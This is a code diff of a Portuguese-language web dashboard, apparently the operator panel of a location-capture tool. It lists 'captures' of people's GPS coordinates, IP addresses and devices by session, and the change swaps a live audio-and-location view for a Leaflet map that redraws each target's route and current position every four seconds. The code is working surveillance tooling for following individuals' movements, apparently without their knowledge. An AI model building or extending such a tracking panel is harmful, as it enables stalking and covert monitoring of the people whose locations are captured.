@@ -5,75 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Painel de Rastreamento</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="/socket.io/socket.io.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body class="bg-gray-900 text-gray-100 min-h-screen p-6">
 
     <div class="max-w-6xl mx-auto space-y-6">
         <div class="flex flex-wrap justify-between items-center gap-3">
             <div>
-                <h1 class="text-2xl font-bold text-emerald-400">Painel de Capturas &amp; Tempo Real</h1>
-                <p id="contador-ao-vivo" class="text-xs text-gray-400 mt-1">Sessões ativas: 0</p>
+                <h1 class="text-2xl font-bold text-emerald-400">Painel de Capturas &amp; Rota</h1>
+                <p id="resumo-rota" class="text-xs text-gray-400 mt-1">Aguardando coordenadas para desenhar a rota...</p>
             </div>
-            <div class="space-x-2">
+            <div class="flex flex-wrap items-center gap-2">
+                <select id="filtro-sessao" onchange="renderizarTudo()" class="bg-gray-800 border border-gray-700 text-xs rounded-lg px-3 py-2 text-gray-200">
+                    <option value="TODAS">Todas as sessões</option>
+                </select>
                 <button onclick="carregarRegistros()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm transition">Atualizar</button>
                 <button onclick="limparRegistros()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-sm transition">Limpar Histórico</button>
             </div>
         </div>
 
-        <!-- Painel de Recados de Voz Enviados e Localização em Tempo Real -->
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 bg-gray-800 p-5 rounded-xl border border-gray-700 shadow-lg">
-            <div class="lg:col-span-2 space-y-3">
-                <div class="flex flex-wrap items-center justify-between gap-2">
-                    <div class="flex items-center gap-2">
-                        <span class="inline-block w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span>
-                        <h2 class="text-sm font-semibold uppercase tracking-wider text-gray-300">Recados de Voz &amp; Monitoramento</h2>
-                    </div>
-                    <div class="flex items-center gap-2">
-                        <select id="seletor-sessao" onchange="selecionarSessao(this.value)" class="bg-gray-900 border border-gray-600 text-xs rounded px-2.5 py-1.5 text-gray-200">
-                            <option value="">Aguardando conexão...</option>
-                        </select>
-                        <button id="btn-reproducao" onclick="alternarReproducaoAuto()" class="bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold px-3 py-1.5 rounded transition">
-                            Reprodução Auto: OFF
-                        </button>
-                    </div>
-                </div>
-
-                <div class="bg-gray-950 rounded-lg border border-gray-700 p-4 min-h-[16rem] flex flex-col justify-between space-y-3">
-                    <div>
-                        <p class="text-xs text-gray-400 mb-2">Último recado de áudio enviado voluntariamente pelo usuário:</p>
-                        <audio id="player-recado" controls class="w-full"></audio>
-                    </div>
-
-                    <div id="lista-recados" class="space-y-2 max-h-40 overflow-y-auto text-xs text-gray-300">
-                        <div class="text-gray-500">Nenhum recado de áudio recebido até o momento.</div>
-                    </div>
-                </div>
+        <!-- Mapa da Rota -->
+        <div class="bg-gray-800 p-4 rounded-xl shadow-lg border border-gray-700 space-y-3">
+            <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-gray-300">
+                <span class="font-semibold text-emerald-400 uppercase tracking-wider">Trajeto em Tempo Real</span>
+                <span id="info-pontos" class="font-mono text-gray-400">0 pontos na rota</span>
             </div>
-
-            <div class="bg-gray-900/70 rounded-lg p-4 border border-gray-700 flex flex-col justify-between space-y-3">
-                <div class="space-y-2 text-xs">
-                    <h3 class="text-sm font-semibold text-emerald-400">Localização em Tempo Real</h3>
-                    <div><span class="text-gray-400">Sessão:</span> <span id="live-sessao" class="font-mono text-gray-200">-</span></div>
-                    <div><span class="text-gray-400">Última atualização:</span> <span id="live-hora" class="font-mono text-gray-200">-</span></div>
-                    <div><span class="text-gray-400">Coordenadas:</span> <span id="live-coords" class="font-mono text-emerald-300">-</span></div>
-                    <div><span class="text-gray-400">Precisão:</span> <span id="live-accuracy" class="font-mono text-gray-200">-</span></div>
-                    <div><span class="text-gray-400">Status da sessão:</span> <span id="live-midia-status" class="text-gray-300">-</span></div>
-                </div>
-
-                <a id="live-maps-link" href="#" target="_blank" class="pointer-events-none opacity-50 bg-emerald-600 hover:bg-emerald-700 text-center text-white text-xs font-semibold py-2.5 rounded-lg transition">
-                    Abrir Localização no Google Maps
-                </a>
-            </div>
+            <div id="mapa-rota" class="w-full h-96 rounded-lg overflow-hidden border border-gray-700 z-0"></div>
         </div>
 
-        <!-- Tabela Histórica de Capturas -->
+        <!-- Tabela Histórica -->
         <div class="bg-gray-800 rounded-xl shadow-lg border border-gray-700 overflow-hidden">
             <div class="overflow-x-auto">
                 <table class="w-full text-left text-sm">
                     <thead class="bg-gray-700 text-gray-300 uppercase text-xs">
                         <tr>
                             <th class="p-4">Data/Hora</th>
+                            <th class="p-4">Sessão</th>
                             <th class="p-4">Latitude / Longitude</th>
                             <th class="p-4">IP / Dispositivo</th>
                             <th class="p-4">Ação</th>
@@ -81,7 +49,7 @@
                     </thead>
                     <tbody id="tabela-corpo" class="divide-y divide-gray-700">
                         <tr>
-                            <td colspan="4" class="p-4 text-center text-gray-400">Carregando registros...</td>
+                            <td colspan="5" class="p-4 text-center text-gray-400">Carregando registros...</td>
                         </tr>
                     </tbody>
                 </table>
@@ -90,171 +58,128 @@
     </div>
 
     <script>
-        const socket = io();
-        const sessoes = {};
-        const recadosRecebidos = [];
-        let sessaoSelecionada = '';
-        let reproducaoAuto = false;
+        let todosRegistros = [];
+        let mapa = null;
+        let camadaRota = null;
+        let marcadorAtual = null;
+        let centralizadoUmaVez = false;
 
-        socket.emit('entrar-painel');
+        function inicializarMapa() {
+            if (mapa) return;
+            mapa = L.map('mapa-rota').setView([-23.96, -46.33], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; OpenStreetMap'
+            }).addTo(mapa);
+            camadaRota = L.layerGroup().addTo(mapa);
+        }
 
         function atualizarSeletorSessoes() {
-            const select = document.getElementById('seletor-sessao');
-            const ids = Object.keys(sessoes);
-            document.getElementById('contador-ao-vivo').textContent = `Sessões ativas: ${ids.length}`;
+            const select = document.getElementById('filtro-sessao');
+            const atual = select.value;
+            const sessoesUnicas = [...new Set(todosRegistros.map(r => r.sessaoId).filter(Boolean))];
 
-            if (ids.length === 0) {
-                select.innerHTML = `<option value="">Aguardando conexão...</option>`;
-                sessaoSelecionada = '';
-                renderizarPainelAoVivo();
+            select.innerHTML = `<option value="TODAS">Todas as sessões</option>` +
+                sessoesUnicas.map(id => `<option value="${id}" ${id === atual ? 'selected' : ''}>${id}</option>`).join('');
+        }
+
+        function obterRegistrosFiltrados() {
+            const filtro = document.getElementById('filtro-sessao').value;
+            if (!filtro || filtro === 'TODAS') return todosRegistros;
+            return todosRegistros.filter(r => r.sessaoId === filtro);
+        }
+
+        function desenharRota(registrosFiltrados) {
+            inicializarMapa();
+            camadaRota.clearLayers();
+            marcadorAtual = null;
+
+            const validos = registrosFiltrados
+                .filter(r => typeof r.latitude === 'number' && typeof r.longitude === 'number')
+                .slice()
+                .reverse(); // Ordem cronológica: do início ao ponto mais recente
+
+            document.getElementById('info-pontos').textContent = `${validos.length} ponto(s) na rota`;
+
+            if (validos.length === 0) {
+                document.getElementById('resumo-rota').textContent = 'Nenhuma coordenada registrada ainda.';
                 return;
             }
 
-            if (!sessaoSelecionada || !sessoes[sessaoSelecionada]) {
-                sessaoSelecionada = ids[ids.length - 1];
+            const coords = validos.map(r => [r.latitude, r.longitude]);
+
+            // Linha da rota percorrida
+            if (coords.length >= 2) {
+                L.polyline(coords, {
+                    color: '#10b981',
+                    weight: 4,
+                    opacity: 0.9
+                }).addTo(camadaRota);
             }
 
-            select.innerHTML = ids.map(id => {
-                const s = sessoes[id];
-                const label = `${id} (${s.dataHora || 'online'})`;
-                return `<option value="${id}" ${id === sessaoSelecionada ? 'selected' : ''}>${label}</option>`;
-            }).join('');
+            // Ponto inicial
+            const inicio = validos[0];
+            L.circleMarker([inicio.latitude, inicio.longitude], {
+                radius: 6,
+                color: '#38bdf8',
+                fillColor: '#0284c7',
+                fillOpacity: 1
+            }).bindPopup(`Início (${inicio.dataHora})`).addTo(camadaRota);
 
-            renderizarPainelAoVivo();
-        }
+            // Ponto mais recente (posição atual)
+            const fim = validos[validos.length - 1];
+            marcadorAtual = L.circleMarker([fim.latitude, fim.longitude], {
+                radius: 8,
+                color: '#ffffff',
+                fillColor: '#10b981',
+                fillOpacity: 1
+            }).bindPopup(`Posição atual (${fim.dataHora})`).addTo(camadaRota);
 
-        function selecionarSessao(id) {
-            sessaoSelecionada = id;
-            renderizarPainelAoVivo();
-        }
-
-        function renderizarPainelAoVivo() {
-            const s = sessoes[sessaoSelecionada];
-            const linkMaps = document.getElementById('live-maps-link');
-
-            if (!s) {
-                document.getElementById('live-sessao').textContent = '-';
-                document.getElementById('live-hora').textContent = '-';
-                document.getElementById('live-coords').textContent = '-';
-                document.getElementById('live-accuracy').textContent = '-';
-                document.getElementById('live-midia-status').textContent = '-';
-                linkMaps.classList.add('pointer-events-none', 'opacity-50');
-                linkMaps.href = '#';
-                return;
-            }
-
-            document.getElementById('live-sessao').textContent = s.sessaoId;
-            document.getElementById('live-hora').textContent = s.dataHora || '-';
-
-            if (s.latitude !== undefined && s.longitude !== undefined) {
-                document.getElementById('live-coords').textContent = `${s.latitude}, ${s.longitude}`;
-                document.getElementById('live-accuracy').textContent = s.accuracy ? `${Math.round(s.accuracy)} m` : '-';
-                linkMaps.href = `https://www.google.com/maps?q=${s.latitude},${s.longitude}`;
-                linkMaps.classList.remove('pointer-events-none', 'opacity-50');
+            if (!centralizadoUmaVez || document.getElementById('filtro-sessao').value !== 'TODAS') {
+                mapa.setView([fim.latitude, fim.longitude], 15);
+                centralizadoUmaVez = true;
             } else {
-                document.getElementById('live-coords').textContent = 'Aguardando GPS...';
-                document.getElementById('live-accuracy').textContent = '-';
-                linkMaps.classList.add('pointer-events-none', 'opacity-50');
+                mapa.panTo([fim.latitude, fim.longitude]);
             }
 
-            document.getElementById('live-midia-status').textContent = s.statusTexto || 'Conectado';
+            document.getElementById('resumo-rota').textContent =
+                `Última posição: ${fim.latitude}, ${fim.longitude} às ${fim.dataHora}`;
         }
 
-        function alternarReproducaoAuto() {
-            reproducaoAuto = !reproducaoAuto;
-            const btn = document.getElementById('btn-reproducao');
-            if (reproducaoAuto) {
-                btn.textContent = 'Reprodução Auto: ON';
-                btn.classList.remove('bg-amber-600', 'hover:bg-amber-700');
-                btn.classList.add('bg-emerald-600', 'hover:bg-emerald-700');
-            } else {
-                btn.textContent = 'Reprodução Auto: OFF';
-                btn.classList.remove('bg-emerald-600', 'hover:bg-emerald-700');
-                btn.classList.add('bg-amber-600', 'hover:bg-amber-700');
-            }
-        }
-
-        function renderizarListaRecados() {
-            const container = document.getElementById('lista-recados');
-            if (recadosRecebidos.length === 0) {
-                container.innerHTML = `<div class="text-gray-500">Nenhum recado de áudio recebido até o momento.</div>`;
+        function renderizarTabela(registrosFiltrados) {
+            const tbody = document.getElementById('tabela-corpo');
+            if (registrosFiltrados.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" class="p-4 text-center text-gray-400">Nenhuma captura realizada ainda.</td></tr>`;
                 return;
             }
 
-            container.innerHTML = recadosRecebidos.slice(0, 8).map((rec, idx) => `
-                <div class="flex items-center justify-between bg-gray-900 px-3 py-2 rounded border border-gray-800">
-                    <div>
-                        <span class="font-mono text-emerald-400">${rec.sessaoId}</span>
-                        <span class="text-gray-400 ml-2">${rec.dataHora}</span>
-                    </div>
-                    <button onclick="tocarRecado(${idx})" class="bg-blue-600 hover:bg-blue-700 text-white px-2.5 py-1 rounded text-xs">
-                        Ouvir
-                    </button>
-                </div>
+            tbody.innerHTML = registrosFiltrados.map(item => `
+                <tr class="hover:bg-gray-750 transition">
+                    <td class="p-4 font-mono text-gray-300">${item.dataHora}</td>
+                    <td class="p-4 font-mono text-xs text-sky-300">${item.sessaoId || '-'}</td>
+                    <td class="p-4 font-mono text-emerald-300">${item.latitude}, ${item.longitude}</td>
+                    <td class="p-4 max-w-xs truncate text-xs text-gray-400" title="${item.userAgent}">
+                        <div><strong>IP:</strong> ${item.ip}</div>
+                        <div class="truncate">${item.userAgent}</div>
+                    </td>
+                    <td class="p-4">
+                        <a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1 rounded text-xs font-semibold inline-block">Ver no Mapa</a>
+                    </td>
+                </tr>
             `).join('');
         }
 
-        function tocarRecado(indice) {
-            const rec = recadosRecebidos[indice];
-            if (!rec) return;
-            const player = document.getElementById('player-recado');
-            player.src = rec.url;
-            player.play().catch(() => {});
+        function renderizarTudo() {
+            const filtrados = obterRegistrosFiltrados();
+            desenharRota(filtrados);
+            renderizarTabela(filtrados);
         }
-
-        socket.on('nova-sessao', (dados) => {
-            sessoes[dados.sessaoId] = { ...(sessoes[dados.sessaoId] || {}), ...dados };
-            atualizarSeletorSessoes();
-        });
-
-        socket.on('localizacao-atualizada', (dados) => {
-            sessoes[dados.sessaoId] = { ...(sessoes[dados.sessaoId] || {}), ...dados };
-            atualizarSeletorSessoes();
-        });
-
-        socket.on('recado-audio', (dados) => {
-            if (!dados || !dados.audio) return;
-            const blob = new Blob([dados.audio], { type: dados.mimeType || 'audio/webm' });
-            const url = URL.createObjectURL(blob);
-            const item = {
-                sessaoId: dados.sessaoId || 'sessao',
-                dataHora: dados.dataHora || new Date().toLocaleString('pt-BR'),
-                url
-            };
-            recadosRecebidos.unshift(item);
-            renderizarListaRecados();
-
-            const player = document.getElementById('player-recado');
-            player.src = url;
-            if (reproducaoAuto) {
-                player.play().catch(() => {});
-            }
-        });
 
         async function carregarRegistros() {
             try {
                 const res = await fetch('/api/registros');
-                const dados = await res.json();
-                const tbody = document.getElementById('tabela-corpo');
-
-                if (dados.length === 0) {
-                    tbody.innerHTML = `<tr><td colspan="4" class="p-4 text-center text-gray-400">Nenhuma captura realizada ainda.</td></tr>`;
-                    return;
-                }
-
-                tbody.innerHTML = dados.map(item => `
-                    <tr class="hover:bg-gray-750 transition">
-                        <td class="p-4 font-mono text-gray-300">${item.dataHora}</td>
-                        <td class="p-4 font-mono text-emerald-300">${item.latitude}, ${item.longitude}</td>
-                        <td class="p-4 max-w-xs truncate text-xs text-gray-400" title="${item.userAgent}">
-                            <div><strong>IP:</strong> ${item.ip}</div>
-                            <div class="truncate">${item.userAgent}</div>
-                        </td>
-                        <td class="p-4">
-                            <a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1 rounded text-xs font-semibold inline-block">Ver no Mapa</a>
-                        </td>
-                    </tr>
-                `).join('');
+                todosRegistros = await res.json();
+                atualizarSeletorSessoes();
+                renderizarTudo();
             } catch (err) {
                 console.error('Erro ao carregar dados:', err);
             }
@@ -263,12 +188,16 @@
         async function limparRegistros() {
             if (confirm('Tem certeza que deseja apagar todos os registros?')) {
                 await fetch('/api/registros', { method: 'DELETE' });
+                centralizadoUmaVez = false;
                 carregarRegistros();
             }
         }
 
-        window.onload = carregarRegistros;
-        setInterval(carregarRegistros, 10000);
+        window.onload = () => {
+            inicializarMapa();
+            carregarRegistros();
+        };
+        setInterval(carregarRegistros, 4000);
     </script>
 </body>
 </html>
